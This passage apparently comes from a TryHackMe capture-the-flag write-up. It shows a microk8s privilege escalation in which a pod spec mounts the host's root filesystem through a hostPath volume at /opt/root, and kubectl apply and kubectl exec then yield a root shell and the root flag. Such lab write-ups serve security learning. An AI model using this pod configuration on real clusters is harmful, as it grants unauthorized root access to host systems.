  containers:                                                                                                                                                                                                                              
  - name: shell                                                                                                                                                                                                                            
    image: localhost:32000/bsnginx                                                                                                                                                                                                         
    command:                                                                                                                                                                                                                               
      - "bin/bash"                                                                                                                                                                                                                         
      - "-c"                                                                                                                                                                                                                               
      - "sleep 10000"                                                                                                                                                                                                                      
    volumeMounts:                                                                                                                                                                                                                          
      - name: root                                                                                                                                                                                                                         
        mountPath: /opt/root                                                                                                                                                                                                               
  volumes:                                                                                                                                                                                                                                 
  - name: root                                                                                                                                                                                                                             
    hostPath:                                                                                                                                                                                                                              
      path: /                                                                                                                                                                                                                              
      type: Directory
```

After modifying the yaml file, I pushed it to create the pod:

```bash
microk8s.kubectl apply -f pod.yaml
```

Once the pod was created, I executed bash using the hostmount command by following the PoC:

```bash
microk8s.kubectl exec -it hostmount /bin/bash
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/812d8d08-42e0-4f91-8c4a-c832e23476ae)

With the successful execution, I finally obtained the root shell and mounted the root folder in '/opt/root.' I was then able to extract the root flag. (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d68d47d3-0798-467f-8db1-3626aee49f8f)


